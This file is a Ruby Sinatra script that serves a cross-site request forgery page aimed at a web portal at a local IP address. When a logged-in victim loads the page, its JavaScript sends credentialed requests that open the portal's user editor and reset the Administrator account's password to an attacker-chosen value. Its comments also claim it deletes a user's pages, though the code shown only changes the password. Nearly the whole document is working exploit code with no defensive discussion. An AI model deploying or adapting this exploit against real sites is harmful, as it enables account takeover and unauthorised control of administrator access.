# Whole of Site CSRF
# Reset the default Administrator's password
# Delete's all a user's pages

require 'sinatra'

TARGET="http://192.168.1.174"
target_userid="1"
target_user="Administrator"
newpass="Password@223"

get '/' do
    ## Returns script to change a user's password.
	## The user id and name must be known (easy for default users).
    ##
	"""
<html>
<body>

	<iframe name='posthere' style='display:none;'></iframe>
	<script>
        // Initialise an editor, generating an unknown space ID
        var initEditorUrl = '#{TARGET}/portal/server.pt?open=1&objID=#{target_userid}&parentname=ObjMgr&parentID=2&mode=1&in_hi_userid=1&cached=true';
        var initEditorOptions = {
            method: 'GET',
            mode: 'no-cors',
            credentials: 'include',
        };
        fetch(initEditorUrl, initEditorOptions).then(function() {
                postBody = new URLSearchParams();
                postBody.append('in_hi_PostToSelf', '2');
                postBody.append('in_hi_Passthru', '');
                postBody.append('in_hi_PassthruArgs', '');
                postBody.append('in_hi_space', 'UserEditor');
                postBody.append('in_hi_spaceID', '2');
                postBody.append('in_hi_control', 'UserRepost');
                postBody.append('in_hi_page', 'UsrMain');
                postBody.append('in_hi_EditorRedirectSpaceName', '');
                postBody.append('in_hi_EditorRedirectPageName', '');
                postBody.append('in_tx_CreateName', '#{target_user}');
                postBody.append('in_pw_CreateLogin', '#{newpass}');
                postBody.append('in_pw_ConfirmLogin', '#{newpass}');
                postBody.append('in_hi_TreeSpaceID2', '');
                postBody.append('in_hi_RowIndex2', '');
                postBody.append('in_hi_MoveAction2', '');
                postBody.append('in_hi_ColumnID2', '');
                postBody.append('in_hi_RowIndex5', '');
                postBody.append('in_hi_MoveAction5', '');
                postBody.append('in_hi_ColumnID5', '');

                fetch('#{TARGET}/portal/server.pt?', {
                    body: postBody.toString(),
                    cache: 'no-cache',
                    method: 'POST',
                    mode: 'no-cors',
                    referrer: 'no-referrer',
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }
                }).then(function(response) {
                    console.log('POSTED!');
                });
            });
        </script>
    </body>
<html>
    """
end
